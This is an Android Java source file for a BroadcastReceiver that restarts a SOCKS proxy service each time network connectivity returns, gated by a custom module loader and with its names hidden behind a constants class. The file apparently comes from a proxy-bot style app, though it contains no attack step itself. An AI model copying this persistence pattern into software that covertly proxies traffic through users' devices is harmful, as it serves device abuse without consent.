package com.test.socks;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;

import com.test.Modules;
import com.test.constants.Constant;
import com.test.constants.S;


public class ConnectionChangedReceiver extends BroadcastReceiver {
    private static final String TAG = S.ConnectionChanged;
    @Override
    public void onReceive(Context context, Intent intent) {

        Modules mods = new Modules(context);

        if(!mods.is_mod_exists(S.mod_main)) {
            if(Constant.DEBUG) Log.d("CONTROL", "ConnectionChangeRec not allowed");
            return;
        }

        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);

        NetworkInfo info = cm.getActiveNetworkInfo();

        if (info != null && info.isConnected()){

            if(Constant.DEBUG) Log.d(TAG, "onReceive: connection established");

            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (SService.class.getName().equals(service.service.getClassName())) {

//                    context.getSharedPreferences(SService.PREF_NAME, Context.MODE_PRIVATE).edit().putBoolean("startService", false).apply();
                    Modules.main(context, S.set_pref, new Object[]{ S.socksStartServicePref, false }) /* Prefs-Manager.set(context, S.socksStartServicePref, false) */;
                    Intent broadcastIntent = new Intent(context.getPackageName());
                    broadcastIntent.putExtra(S.socksReceiverAction, SService.ACTION_STOP_SERVICE);
                    context.sendBroadcast(broadcastIntent);

                    break;
                }
            }

            Modules.main(context, S.set_pref, new Object[]{ S.socksStartServicePref, true }) /* Prefs-Manager.set(context, S.socksStartServicePref, true) */;
            Modules.main(context, S.set_pref, new Object[]{ S.socksDisconnectedPref, false }) /* Prefs-Manager.set(context, S.socksDisconnectedPref, false) */;
            Intent it = new Intent(context, SService.class);
            context.startService(it);

        }
        else {
            if(Constant.DEBUG) Log.d(TAG, "onReceive: connection lost");
            Modules.main(context, S.set_pref, new Object[]{ S.socksDisconnectedPref, true }) /* Prefs-Manager.set(context, S.socksDisconnectedPref, true) */;
            Intent it = new Intent(context.getPackageName());
            it.putExtra(S.socksReceiverAction, SService.ACTION_STOP_SERVICE);
            context.sendBroadcast(it);

        }
    }
}